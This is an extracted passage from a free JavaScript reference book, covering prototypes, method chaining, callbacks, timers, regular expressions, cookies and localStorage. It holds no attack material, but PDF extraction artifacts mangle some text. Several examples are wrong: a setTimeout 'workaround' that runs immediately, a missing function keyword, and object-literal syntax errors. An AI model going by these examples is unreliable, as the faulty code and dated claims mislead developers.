JavaScript
Notes for ProfessionalsJavaScript®
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial JavaScript ® group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks
Contents
About  1  ................................................................................................................................................................................... 
Object.prototype .breakingLibraries  = 'foo';
console. log(obj.breakingLibraries );
console. log(prototype .breakingLibraries );
Console output
"foo"
"foo"
Fun fact  I've used the browser console to make these examples and broken this page by adding that
breakingLibraries  property.
Section 27.4: Pseudo-classical inheritance
It's an emulation of classical inheritance using prototypical inheritance which shows how powerful prototypes are. It
was made to make the language more attractive to programmers coming from other languages.
Version < 6
IMPORTANT NOTE : Since ES6 it doesn't make sense to use pseudo-classical inheritance since the language
simulates conventional classes. If you're not using ES6, you should . If you still want to use the classical inheritance
pattern and you're in a ECMAScript 5 or lower environment, then pseudo-classical is your best bet.
A "class" is just a function that is made to be called with the new operand and it's used as a constructor.
function  Foo(id, name) {
    this.id = id;
    this.name = name;
}
var foo = new Foo(1, 'foo');
GoalKicker.com – JavaScript ® Notes for Professionals 208console. log(foo.id);
Console output
1
foo is an instance of Foo. The JavaScript coding convention says if a function begins with a capital letter case it can
be called as a constructor (with the new operand).
To add properties or methods to the "class" you have to add them to its prototype, which can be found in the
prototype  property of the constructor.
Foo.prototype .bar = 'bar';
console. log(foo.bar);
Console output
bar
In fact what Foo is doing as a "constructor" is just creating objects with Foo.prototype  as it's prototype.
You can ﬁnd a reference to its constructor on every object
console. log(foo.constructor );
function Foo(id, name) { ...
console. log({ }.constructor );
function Object() { [native code] }
And also check if an object is an instance of a given class with the instanceof  operator
console. log(foo instanceof  Foo);
true
console. log(foo instanceof  Object);
true
Section 27.5: Setting an Object's prototype
Version ≥ 5
With ES5+, the Object.create  function can be used to create an Object with any other Object as it's prototype.
GoalKicker.com – JavaScript ® Notes for Professionals 209const anyObj = {
    hello () {
        console. log(`this.foo is ${this.foo}`);
    },
};
let objWithProto = Object.create(anyObj);
objWithProto. foo = 'bar';
objWithProto. hello(); // "this.foo is bar"
To explicitly create an Object without a prototype, use null  as the prototype. This means the Object will not inherit
from Object.prototype  either and is useful for Objects used for existence checking dictionaries, e.g.
let objInheritingObject = {};
let objInheritingNull = Object.create(null);
'toString'  in objInheritingObject ; // true
'toString'  in objInheritingNull ; // false
Version ≥ 6
From ES6, the prototype of an existing Object can be changed using Object.setPrototypeOf , for example
let obj = Object.create({foo: 'foo'});
obj = Object.setPrototypeOf (obj, {bar: 'bar'});
obj.foo; // undefined
obj.bar; // "bar"
This can be done almost anywhere, including on a this  object or in a constructor.
Note:  This process is very slow in current browsers and should be used sparingly, try to create the Object with the
desired prototype instead.
Version < 5
Before ES5, the only way to create an Object with a manually deﬁned prototype was to construct it with new, for
example
var proto = {fizz: 'buzz'};
function  ConstructMyObj () {}
ConstructMyObj. prototype  = proto;
var objWithProto = new ConstructMyObj ();
objWithProto. fizz; // "buzz"
This behaviour is close enough to Object.create  that it is possible to write a polyﬁll.
GoalKicker.com – JavaScript ® Notes for Professionals 210Chapter 28: Method Chaining
Section 28.1: Chainable object design and chaining
Chaining and Chainable is a design methodology used to design object behaviors so that calls to object functions
return references to self, or another object, providing access to additional function calls allowing the calling
statement to chain together many calls without the need to reference the variable holding the object/s.
Objects that can be chained are said to be chainable. If you call an object chainable, you should ensure that all
returned objects / primitives are of the correct type. It only takes one time for your chainable object to not return
the correct reference (easy to forget to add return this ) and the person using your API will lose trust and avoid
chaining. Chainable objects should be all or nothing (not a chainable object even if parts are). An object should not
be called chainable if only some of its functions are.
Object designed to be chainable
function  Vec(x = 0, y = 0){
    this.x = x;
    this.y = y;
    // the new keyword implicitly implies the return type
    // as this and thus is chainable by default.
}
Vec.prototype  = {
    add : function (vec){
        this.x += vec.x;
        this.y += vec.y;
        return this; // return reference to self to allow chaining of function calls
    },
    scale : function (val){
        this.x *= val;
        this.y *= val;
        return this; //  return reference to self to allow chaining of function calls
    },
    log :function (val){
        console. log(this.x + ' : ' + this.y);
        return this;
    },
    clone : function (){
        return new Vec(this.x,this.y);
    }
}
Chaining example
var vec = new Vec();
vec.add({x:10,y:10})
    .add({x:10,y:10})
    .log()             // console output "20 : 20"
    .add({x:10,y:10})
    .scale(1/30)
    .log()             // console output "1 : 1"
    .clone()           // returns a new instance of the object
    .scale(2)          // from which you can continue chaining
    .log()
Don't create ambiguity in the return type
Not all function calls return a useful chainable type, nor do they always return a reference to self. This is where
common sense use of naming is important. In the above example the function call .clone() is unambiguous. Other
GoalKicker.com – JavaScript ® Notes for Professionals 211examples are .toString () implies a string is returned.
An example of an ambiguous function name in a chainable object.
 // line object represents a line
 line.rotate(1)
    .vec();  // ambiguous you don't need to be looking up docs while writing.
 line.rotate(1)
    .asVec()    // unambiguous implies the return type is the line as a vec (vector)
    .add({x:10,y:10)
 // toVec is just as good as long as the programmer can use the naming
 // to infer the return type
Syntax convention
There is no formal usage syntax when chaining. The convention is to either chain the calls on a single line if short or
to chain on the new line indented one tab from the referenced object with the dot on the new line. Use of the
semicolon is optional but does help by clearly denoting the end of the chain.
  vec.scale(2).add({x:2,y:2}).log();  // for short chains
  vec.scale(2)     // or alternate syntax
      .add({x:2,y:2})
      .log();  // semicolon makes it clear the chain ends here
  // and sometimes though not necessary
  vec.scale(2)    
      .add({x:2,y:2})
      .clone()    // clone adds a new reference to the chain
           . log(); // indenting to signify the new reference
  // for chains in chains
  vec.scale(2)    
      .add({x:2,y:2})
      .add(vec1.add({x:2,y:2})  // a chain as an argument
           . add({x:2,y:2})      // is indented
           . scale(2))
      .log();
  // or sometimes
  vec.scale(2)    
      .add({x:2,y:2})
      .add(vec1.add({x:2,y:2})  // a chain as an argument
           . add({x:2,y:2})      // is indented
           . scale(2)
      ).log();   // the argument list is closed on the new line
A bad syntax
   vec          // new line before the first function call
      .scale()  // can make it unclear what the intention is
      .log();
   vec.          // the dot on the end of the line
      scale (2).  // is very difficult to see in a mass of code
      scale (1/2); // and will likely frustrate as can easily be missed
                  // when trying to locate bugs
Left hand side of assignment
GoalKicker.com – JavaScript ® Notes for Professionals 212When you assign the results of a chain the last returning call or object reference is assigned.
 var vec2 = vec.scale(2)
                . add(x:1,y:10)
                . clone();   // the last returned result is assigned
                                // vec2 is a clone of vec after the scale and add
In the above example vec2  is assigned the value returned from the last call in the chain. In this case, that would be
a copy of vec after the scale and add.
Summary
The advantage of changing is clearer more maintainable code. Some people prefer it and will make chainable a
requirement when selecting an API. There is also a performance beneﬁt as it allows you to avoid having to create
variables to hold interim results. With the last word being that chainable objects can be used in a conventional way
as well so you don't enforce chaining by making an object chainable.
Section 28.2: Method Chaining
Method chaining is a programming strategy that simpliﬁes your code and beautiﬁes it. Method chaining is done by
ensuring that each method on an object returns the entire object, instead of returning a single element of that
object. For example:
function  Door() {
    this.height = '';
    this.width = '';
    this.status = 'closed' ;
}
Door.prototype .open = function () {
    this.status = 'opened' ;
    return this;
}
Door.prototype .close = function () {
    this.status = 'closed' ;
    return this;
}
Door.prototype .setParams  = function (width,height) {
    this.width = width;
    this.height = height;
    return this;
}
Door.prototype .doorStatus  = function () {
    console. log('The',this.width,'x',this.height,'Door is' ,this.status);
    return this;
}
var smallDoor = new Door();
smallDoor. setParams (20,100).open().doorStatus ().close().doorStatus ();
Note that each method in Door.prototype  returns this , which refers to the entire instance of that Door  object.
GoalKicker.com – JavaScript ® Notes for Professionals 213Chapter 29: Callbacks
Section 29.1: Simple Callback Usage Examples
Callbacks oﬀer a way to extend the functionality of a function (or method) without changing  its code. This approach
is often used in modules (libraries / plugins), the code of which is not supposed to be changed.
Suppose we have written the following function, calculating the sum of a given array of values:
function  foo(array) {
    var sum = 0;
    for (var i = 0; i < array.length; i++) {
        sum += array[i];
    }
    return sum;
}
Now suppose that we want to do something with each value of the array, e.g. display it using alert(). We could
make the appropriate changes in the code of foo, like this:
function  foo(array) {
    var sum = 0;
    for (var i = 0; i < array.length; i++) {
        alert (array[i]);
        sum += array[i];
    }
    return sum;
}
But what if we decide to use console. log instead of alert()? Obviously changing the code of foo, whenever we
decide to do something else with each value, is not a good idea. It is much better to have the option to change our
mind without changing the code of foo. That's exactly the use case for callbacks. We only have to slightly change
foo's signature and body:
function  foo(array, callback ) {
    var sum = 0;
    for (var i = 0; i < array.length; i++) {
        callback (array[i]);
        sum += array[i];
    }
    return sum;
}
And now we are able to change the behaviour of foo just by changing its parameters:
var array = [];
foo(array, alert);
foo(array, function  (x) {
    console. log(x);
});
Examples with Asynchronous Functions
In jQuery, the $.getJSON() method to fetch JSON data is asynchronous. Therefore, passing code in a callback
makes sure that the code is called after  the JSON is fetched.
GoalKicker.com – JavaScript ® Notes for Professionals 214$.getJSON() syntax:
$.getJSON( url, dataObject , successCallback );
Example of $.getJSON() code:
$.getJSON("foo.json" , {}, function (data) {
    // data handling code
});
The following would not work, because the data-handling code would likely be called before  the data is actually
received, because the $.getJSON  function takes an unspeciﬁed length of time and does not hold up the call stack as
it waits for the JSON.
$.getJSON("foo.json" , {});
// data handling code
Another example of an asynchronous function is jQuery's animate() function. Because it takes a speciﬁed time to
run the animation, sometimes it is desirable to run some code directly following the animation.
.animate() syntax:
jQueryElement. animate( properties , duration , callback );
For example, to create a fading-out animation after which the element completely disappears, the following code
can be run. Note the use of the callback.
elem.animate( { opacity : 0 }, 5000, function () {
    elem. hide();
} );
This allows the element to be hidden right after the function has ﬁnished execution. This diﬀers from:
elem.animate( { opacity : 0 }, 5000 );
elem.hide();
because the latter does not wait for animate() (an asynchronous function) to complete, and therefore the element
is hidden right away, producing an undesirable eﬀect.
Section 29.2: Continuation (synchronous and asynchronous)
Callbacks can be used to provide code to be executed after a method has completed:
/**
 * @arg {Function} then continuation callback
 */
function  doSomething (then) {
  console. log('Doing something' );
  then();
}
// Do something, then execute callback to log 'done'
doSomething (function  () {
  console. log('Done');
});
GoalKicker.com – JavaScript ® Notes for Professionals 215console. log('Doing something else' );
// Outputs:
//   "Doing something"
//   "Done"
//   "Doing something else"
The doSomething () method above executes synchronously with the callback - execution blocks until doSomething ()
returns, ensuring that the callback is executed before the interpreter moves on.
Callbacks can also be used to execute code asynchronously:
doSomethingAsync (then) {
  setTimeout (then, 1000);
  console. log('Doing something asynchronously' );
}
doSomethingAsync (function () {
  console. log('Done');
});
console. log('Doing something else' );
// Outputs:
//   "Doing something asynchronously"
//   "Doing something else"
//   "Done"
The then  callbacks are considered continuations of the doSomething () methods. Providing a callback as the last
instruction in a function is called a tail-call , which is optimized by ES2015 interpreters .
Section 29.3: What is a callback?
This is a normal function call:
console. log("Hello World!" );
When you call a normal function, it does its job and then returns control back to the caller.
However, sometimes a function needs to return control back to the caller in order to do its job:
[1,2,3].map(function  double(x) {
    return 2 * x;
});
In the above example, the function double  is a callback for the function map because:
The function double  is given to the function map by the caller. 1.
The function map needs to call the function double  zero or more times in order to do its job. 2.
Thus, the function map is essentially returning control back to the caller every time it calls the function double .
Hence, the name “callback ”.
Functions may accept more than one callback:
promise. then(function  onFulfilled (value) {
    console. log("Fulfilled with value "  + value);
GoalKicker.com – JavaScript ® Notes for Professionals 216}, function  onRejected (reason) {
    console. log("Rejected with reason "  + reason);
});
Here then function then  accepts two callback functions, onFulfilled  and onRejected . Furthermore, only one of
these two callback functions is actually called.
What's more interesting is that the function then  returns before either of the callbacks are called. Hence, a callback
function may be called even after the original function has returned.
Section 29.4: Callbacks and `this`
Often when using a callback you want access to a speciﬁc context.
function  SomeClass (msg, elem) {
  this.msg = msg;
  elem.addEventListener ('click', function () {
    console. log(this.msg);  // <= will fail because "this" is undefined
  });
}
var s = new SomeClass ("hello", someElement );
Solutions
Use bind
bind  eﬀectively generates a new function that sets this  to whatever was passed to bind  then calls the
original function.
  function  SomeClass (msg, elem) {
    this.msg = msg;
    elem. addEventListener ('click', function () {
      console. log(this.msg);  
    }.bind(this));  // <=-  bind the function to `this`
  }
Use arrow functions
Arrow functions automatically bind the current this  context.
  function  SomeClass (msg, elem) {
    this.msg = msg;
    elem. addEventListener ('click',() => {   // <=-  arrow function binds `this`
      console. log(this.msg);  
    });
  }
Often you'd like to call a member function, ideally passing any arguments that were passed to the event on to the
function.
Solutions:
Use bind
  function  SomeClass (msg, elem) {
GoalKicker.com – JavaScript ® Notes for Professionals 217    this.msg = msg;
    elem. addEventListener ('click', this.handleClick .bind(this));
  }
  SomeClass. prototype .handleClick  = function (event) {
    console. log(event.type, this.msg);
  };
Use arrow functions and the rest operator
  function  SomeClass (msg, elem) {
    this.msg = msg;
    elem. addEventListener ('click', (...a) => this.handleClick (...a));
  }
  SomeClass. prototype .handleClick  = function (event) {
    console. log(event.type, this.msg);
  };
For DOM event listeners in particular you can implement the EventListener  interface
  function  SomeClass (msg, elem) {
    this.msg = msg;
    elem. addEventListener ('click', this);
  }
  SomeClass. prototype .handleEvent  = function (event) {
    var fn = this[event.type];
    if (fn) {
       fn. apply(this, arguments );
    }
  };
 
  SomeClass. prototype .click = function (event) {
    console. log(this.msg);
  };
Section 29.5: Callback using Arrow function
Using arrow function as callback function can reduce lines of code.
The default syntax for arrow function is
() => {}
This can be used as callbacks
For example if we want to print all elements in an array [1,2,3,4,5]
without arrow function, the code will look like this
[1,2,3,4,5].forEach(function (x){
                 console. log(x);
            }
With arrow function, it can be reduced to
GoalKicker.com – JavaScript ® Notes for Professionals 218[1,2,3,4,5].forEach(x => console. log(x));
Here the callback function function (x){console. log(x)} is reduced to x=>console. log(x)
Section 29.6: Error handling and control-ﬂow branching
Callbacks are often used to provide error handling. This is a form of control ﬂow branching, where some
instructions are executed only when an error occurs:
const expected = true;
function  compare (actual, success , failure ) {
  if (actual === expected ) {
    success ();
  } else {
    failure ();
  }
}
function  onSuccess () {
  console. log('Value was expected' );
}
function  onFailure () {
  console. log('Value was unexpected/exceptional' );
}
compare(true, onSuccess , onFailure );
compare(false, onSuccess , onFailure );
// Outputs:
//   "Value was expected"
//   "Value was unexpected/exceptional"
Code execution in compare() above has two possible branches: success  when the expected and actual values are
the same, and error  when they are diﬀerent. This is especially useful when control ﬂow should branch after some
asynchronous instruction:
function  compareAsync (actual, success , failure ) {
  setTimeout (function  () {
    compare (actual, success , failure )
  }, 1000);
}
compareAsync (true, onSuccess , onFailure );
compareAsync (false, onSuccess , onFailure );
console. log('Doing something else' );
// Outputs:
//   "Doing something else"
//   "Value was expected"
//   "Value was unexpected/exceptional"
It should be noted, multiple callbacks do not have to be mutually exclusive  – both methods could be called.
Similarly, the compare() could be written with callbacks that are optional (by using a noop  as the default value - see
Null Object pattern ).
GoalKicker.com – JavaScript ® Notes for Professionals 219Chapter 30: Intervals and Timeouts
Section 30.1: Recursive setTimeout
To repeat a function indeﬁnitely, setTimeout  can be called recursively:
function  repeatingFunc () {
    console. log("It's been 5 seconds. Execute the function again." );
    setTimeout (repeatingFunc , 5000);
}
setTimeout (repeatingFunc , 5000);
Unlike setInterval , this ensures that the function will execute even if the function's running time is longer than the
speciﬁed delay. However, it does not guarantee a regular interval between function executions. This behaviour also
varies because an exception before the recursive call to setTimeout  will prevent it from repeating again, while
setInterval  would repeat indeﬁnitely regardless of exceptions.
Section 30.2: Intervals
function  waitFunc (){
    console. log("This will be logged every 5 seconds" );
}
window.setInterval (waitFunc ,5000);
Section 30.3: Intervals
Standard
You don't need to create the variable, but it's a good practice as you can use that variable with clearInterval to stop
the currently running interval.
var int = setInterval ("doSomething()" , 5000 ); /* 5 seconds */
var int = setInterval (doSomething , 5000 ); /* same thing, no quotes, no parens */
If you need to pass parameters to the doSomething function, you can pass them as additional parameters beyond
the ﬁrst two to setInterval.
Without overlapping
setInterval, as above, will run every 5 seconds (or whatever you set it to) no matter what. Even if the function
doSomething takes long than 5 seconds to run. That can create issues. If you just want to make sure there is that
pause in between runnings of doSomething, you can do this:
(function (){
   doSomething ();
   setTimeout (arguments. callee, 5000);
})()
GoalKicker.com – JavaScript ® Notes for Professionals 220Section 30.4: Removing intervals
window.setInterval () returns an IntervalID , which can be used to stop that interval from continuing to run. To
do this, store the return value of window.setInterval () in a variable and call clearInterval () with that variable as
the only argument:
function  waitFunc (){
    console. log("This will be logged every 5 seconds" );
}    
var interval = window. setInterval (waitFunc ,5000);
window.setTimeout (function (){
    clearInterval (interval );
},32000);
This will log This will be logged every 5 seconds  every 5 seconds, but will stop it after 32 seconds. So it will log
the message 6 times.
Section 30.5: Removing timeouts
window.setTimout () returns a TimeoutID , which can be used to stop that timeout from running. To do this, store
the return value of window.setTimeout () in a variable and call clearTimeout () with that variable as the only
argument:
function  waitFunc (){
    console. log("This will not be logged after 5 seconds" );
}
function  stopFunc (){
    clearTimeout (timeout);
}
var timeout = window. setTimeout (waitFunc ,5000);
window.setTimeout (stopFunc ,3000);
This will not log the message because the timer is stopped after 3 seconds.
Section 30.6: setTimeout, order of operations, clearTimeout
setTimeout
Executes a function, after waiting a speciﬁed number of milliseconds.
used to delay the execution of a function.
Syntax :  setTimeout (function , milliseconds ) or window.setTimeout (function , milliseconds )
Example :  This example outputs "hello" to the console after 1 second. The second parameter is in milliseconds, so
1000 = 1 sec, 250 = 0.25 sec, etc.
setTimeout (function () {
    console. log('hello');
}, 1000);
Problems with setTimeout
if you're using the setTimeout  method in a for loop :
GoalKicker.com – JavaScript ® Notes for Professionals 221for (i = 0; i < 3; ++i) {
  setTimeout (function (){
    console. log(i);
  }, 500);
}
This will output the value 3 three  times, which is not correct.
Workaround of this problem :
for (i = 0; i < 3; ++i) {
  setTimeout (function (j){
    console. log(i);
  }(i), 1000);
}
It will output the value 0,1,2. Here, we ’re passing the i into the function as a parameter( j).
Order of operations
Additionally though, due to the fact that JavaScript is single threaded and uses a global event loop, setTimeout  can
be used to add an item to the end of the execution queue by calling setTimeout  with zero delay. For example:
setTimeout (function () {
    console. log('world');
}, 0);
console. log('hello');
Will actually output:
hello
world
Also, zero milliseconds here does not mean the function inside the setTimeout will execute immediately. It will take
slightly more than that depending upon the items to be executed remaining in the execution queue. This one is just
pushed to the end of the queue.
Cancelling a timeout
clearTimeout() :  stops the execution of the function speciﬁed in setTimeout ()
Syntax :  clearTimeout(timeoutVariable) or window.clearTimeout(timeoutVariable)
Example :
var timeout = setTimeout (function () {
    console. log('hello');
}, 1000);
clearTimeout (timeout); // The timeout will no longer be executed
GoalKicker.com – JavaScript ® Notes for Professionals 222Chapter 31: Regular expressions
Flags Details
g global. All matches (don't return on the ﬁrst match).
m multi-line. Causes ^ & $ to match the begin/end of each line (not only begin/end of string).
i insensitive. Case insensitive match (ignores case of [a-zA-Z]).
u unicode : Pattern strings are treated as UTF-16 . Also causes escape sequences to match Unicode characters.
ystick y: matches only from the index indicated by the lastIndex property of this regular expression in the
target string (and does not attempt to match from any later indexes).
Section 31.1: Creating a RegExp Object
Standard Creation
It is recommended to use this form only when creating regex from dynamic variables.
Use when the expression may change or the expression is user generated.
var re = new RegExp(".*");
With ﬂags:
var re = new RegExp(".*", "gmi");
With a backslash: (this must be escaped because the regex is speciﬁed with a string)
var re = new RegExp("\\w*");
Static initialization
Use when you know the regular expression will not change, and you know what the expression is before runtime.
var re = /.*/;
With ﬂags:
var re = /.*/gmi;
With a backslash: (this should not be escaped because the regex is speciﬁed in a literal)
var re = /\w*/;
Section 31.2: RegExp Flags
There are several ﬂags you can specify to alter the RegEx behaviour. Flags may be appended to the end of a regex
literal, such as specifying gi in /test/gi, or they may be speciﬁed as the second argument to the RegExp
constructor, as in new RegExp('test', 'gi').
g - Global. Finds all matches instead of stopping after the ﬁrst.
i - Ignore case. /[a-z]/i is equivalent to /[a-zA-Z]/.
GoalKicker.com – JavaScript ® Notes for Professionals 223m - Multiline. ^ and $ match the beginning and end of each line respectively treating \n and \r as delimiters instead
of simply the beginning and end of the entire string.
Version ≥ 6
u - Unicode. If this ﬂag is not supported you must match speciﬁc Unicode characters with \uXXXX  where XXXX  is the
character's value in hexadecimal.
y - Finds all consecutive/adjacent matches.
Section 31.3: Check if string contains pattern using .test()
var re = /[a-z]+/ ;
if (re.test("foo")) {
    console. log("Match exists." );
}
The test  method performs a search to see if a regular expression matches a string. The regular expression [a-z]+
will search for one or more lowercase letters. Since the pattern matches the string, “match exists ” will be logged to
the console.
Section 31.4: Matching With .exec()
Match Using .exec()
RegExp.prototype .exec(string) returns an array of captures, or null  if there was no match.
var re = /([0-9]+)[a-z]+/ ;
var match = re.exec("foo123bar" );
match.index  is 3, the (zero-based) location of the match.
match[0] is the full match string.
match[1] is the text corresponding to the ﬁrst captured group. match[n] would be the value of the nth captured
group.
Loop Through Matches Using .exec()
var re = /a/g;
var result;
while ((result = re.exec('barbatbaz' )) !== null) {
    console. log("found '"  + result[0] + "', next exec starts at index '"  + re.lastIndex  + "'");
}
Expected output
found 'a', next exec starts at index '2'
found 'a', next exec starts at index '5'
found 'a', next exec starts at index '8'
Section 31.5: Using RegExp With Strings
The String object has the following methods that accept regular expressions as arguments.
GoalKicker.com – JavaScript ® Notes for Professionals 224"string" .match(...
"string" .replace(...
"string" .split(...
"string" .search(...
Match with RegExp
console. log("string" .match(/[i-n]+/ ));
console. log("string" .match(/(r)[i-n]+/ ));
Expected output
Array ["in"]
Array ["rin", "r"]
Replace with RegExp
console. log("string" .replace(/[i-n]+/ , "foo"));
Expected output
strfoog
Split with RegExp
console. log("stringstring" .split(/[i-n]+/ ));
Expected output
Array ["str", "gstr", "g"]
Search with RegExp
.search() returns the index at which a match is found or -1.
console. log("string" .search(/[i-n]+/ ));
console. log("string" .search(/[o-q]+/ ));
Expected output
3
-1
Section 31.6: RegExp Groups
JavaScript supports several types of group in its Regular Expressions, capture groups , non-capture groups  and look-
aheads . Currently, there is no look-behind  support.
Capture
Sometimes the desired match relies on its context. This means a simple RegExp  will over-ﬁnd the piece of the String
GoalKicker.com – JavaScript ® Notes for Professionals 225that is of interest, so the solution is to write a capture group (pattern). The captured data can then be referenced
as...
String replacement "$n"  where n is the n th capture group (starting from 1)
The n th argument in a callback function
If the RegExp  is not ﬂagged g, the n+1 th  item in a returned str.match  Array
If the RegExp  is ﬂagged g, str.match  discards captures, use re.exec  instead
Say there is a String  where all + signs need to be replaced with a space, but only if they follow a letter character. This
means a simple match would include that letter character and it would also be removed. Capturing it is the solution
as it means the matched letter can be preserved.
let str = "aa+b+cc+1+2" ,
    re = /([a-z])\+/g ;
// String replacement
str.replace(re, '$1 '); // "aa b cc 1+2"
// Function replacement
str.replace(re, (m, $1) => $1 + ' '); // "aa b cc 1+2"
Non-Capture
Using the form (?:pattern), these work in a similar way to capture groups, except they do not store the contents
of the group after the match.
They can be particularly useful if other data is being captured which you don't want to move the indices of, but
need to do some advanced pattern matching such as an OR
let str = "aa+b+cc+1+2" ,
    re = /(?:\b|c)([a-z])\+/g ;
str.replace(re, '$1 '); // "aa+b c 1+2"
Look-Ahead
If the desired match relies on something which follows it, rather than matching that and capturing it, it is possible to
use a look-ahead to test for it but not include it in the match. A positive look-ahead has the form (?=pattern), a
negative look-ahead (where the expression match only happens if the look-ahead pattern did not match) has the
form (?!pattern)
let str = "aa+b+cc+1+2" ,
    re = /\+(?=[a-z])/g ;
str.replace(re, ' '); // "aa b cc+1+2"
Section 31.7: Replacing string match with a callback function
String#replace  can have a function as its second argument so you can provide a replacement based on some
logic.
"Some string Some" .replace(/Some/g, (match, startIndex , wholeString ) => {
  if(startIndex == 0){
    return 'Start';
  } else {
    return 'End';
GoalKicker.com – JavaScript ® Notes for Professionals 226  }
});
// will return Start string End
One line template library
let data = {name: 'John', surname : 'Doe'}
"My name is {surname}, {name} {surname}" .replace(/(?:{(.+?)})/g , x => data[x.slice(1,-1)]);
// "My name is Doe, John Doe"
Section 31.8: Using Regex.exec() with parentheses regex to
extract matches of a string
Sometimes you doesn't want to simply replace or remove the string. Sometimes you want to extract and process
matches. Here an example of how you manipulate matches.
What is a match ? When a compatible substring is found for the entire regex in the string, the exec command
produce a match. A match is an array compose by ﬁrstly the whole substring that matched and all the parenthesis
in the match.
Imagine a html string :
<html>
<head></head>
<body>
  <h1>Example</h1>
  <p>Look at this great link : <a href="http://goalkicker.com" >goalkicker </a>
http://anotherlinkoutsideatag </p>
  Copyright <a href="https://stackoverflow.com" >Stackoverflow </a>
</body>
You want to extract and get all the links inside an a tag. At ﬁrst, here the regex you write :
var re = /<a[^>]*href="https?:\/\/.*"[^>]*>[^<]*<\/a>/g ;
But now, imagine you want the href  and the anchor  of each link. And you want it together. You can simply add a
new regex in for each match OR you can use parentheses :
var re = /<a[^>]*href="(https?:\/\/.*)"[^>]*>([^<]*)<\/a>/g ;
var str = '<html>\n    <head></head> \n    <body> \n        <h1>Example</h1> \n        <p>Look at this
great link: <a href="http://goalkicker.com">goalkicker</a> http://anotherlinkoutsideatag</p> \n\n  
     Copyright <a href="https://stackoverflow.com">Stackoverflow</a> \n    </body> \';\n';
var m;
var links = [];
while ((m = re.exec(str)) !== null) {
    if (m.index === re.lastIndex ) {
        re. lastIndex ++;
    }
    console. log(m[0]); // The all substring
    console. log(m[1]); // The href subpart
    console. log(m[2]); // The anchor subpart
    links. push({
      match : m[0],   // the entire match
      href : m[1],    // the first parenthesis => (https?:\/\/.*)
GoalKicker.com – JavaScript ® Notes for Professionals 227      anchor : m[2],  // the second one => ([^<]*)
    });
}
At the end of the loop, you have an array of link with anchor  and href  and you can use it to write markdown for
example :
links.forEach(function (link) {
  console. log('[%s](%s)' , link.anchor, link.href);
});
To go further :
Nested parenthesis
GoalKicker.com – JavaScript ® Notes for Professionals 228Chapter 32: Cookies
Section 32.1: Test if cookies are enabled
If you want to make sure cookies are enabled before using them, you can use navigator. cookieEnabled :
if (navigator. cookieEnabled  === false)
{
    alert ("Error: cookies not enabled!" );
}
Note that on older browsers navigator. cookieEnabled  may not exist and be undeﬁned. In those cases you won't
detect that cookies are not enabled.
Section 32.2: Adding and Setting Cookies
The following variables set up the below example:
var COOKIE_NAME = "Example Cookie" ;    /* The cookie's name. */
var COOKIE_VALUE = "Hello, world!" ;    /* The cookie's value. */
var COOKIE_PATH = "/foo/bar" ;          /* The cookie's path. */
var COOKIE_EXPIRES ;                    /* The cookie's expiration date (config'd below). */
/* Set the cookie expiration to 1 minute in future (60000ms = 1 minute). */
COOKIE_EXPIRES = (new Date(Date.now() + 60000)).toUTCString ();
document. cookie +=
  COOKIE_NAME + "=" + COOKIE_VALUE
  + "; expires="  + COOKIE_EXPIRES
  + "; path="  + COOKIE_PATH ;
Section 32.3: Reading cookies
var name = name + "=",
    cookie_array = document. cookie.split(';'),
    cookie_value ;
for(var i=0;i<cookie_array. length;i++) {
    var cookie=cookie_array [i];
    while (cookie.charAt(0)==' ')
        cookie = cookie. substring (1,cookie.length);
    if(cookie.indexOf(name)==0)
        cookie_value = cookie. substring (name.length,cookie.length);
    }
This will set cookie_value  to the value of the cookie, if it exists. If the cookie is not set, it will set cookie_value  to
null
Section 32.4: Removing cookies
var expiry = new Date();
expiry.setTime(expiry.getTime() - 3600);
document. cookie = name + "=; expires="  + expiry. toGMTString () + "; path=/"
This will remove the cookie with a given name .
GoalKicker.com – JavaScript ® Notes for Professionals 229Chapter 33: Web Storage
Parameter Description
name The key/name of the item
value The value of the item
Section 33.1: Using localStorage
The localStorage object provides persistent (but not permanent - see limits below) key-value storage of strings. Any
changes are immediately visible in all other windows/frames from the same origin. The stored values persistent
indeﬁnitely unless the user clears saved data or conﬁgures an expiration limit. localStorage uses a map-like
interface for getting and setting values.
localStorage. setItem('name', "John Smith" );
console. log(localStorage. getItem('name')); // "John Smith"
localStorage. removeItem ('name');
console. log(localStorage. getItem('name')); // null
If you want to store simple structured data, you can use JSON to serialize it to and from strings for storage.
var players = [{name: "Tyler", score: 22}, {name: "Ryan", score: 41}];
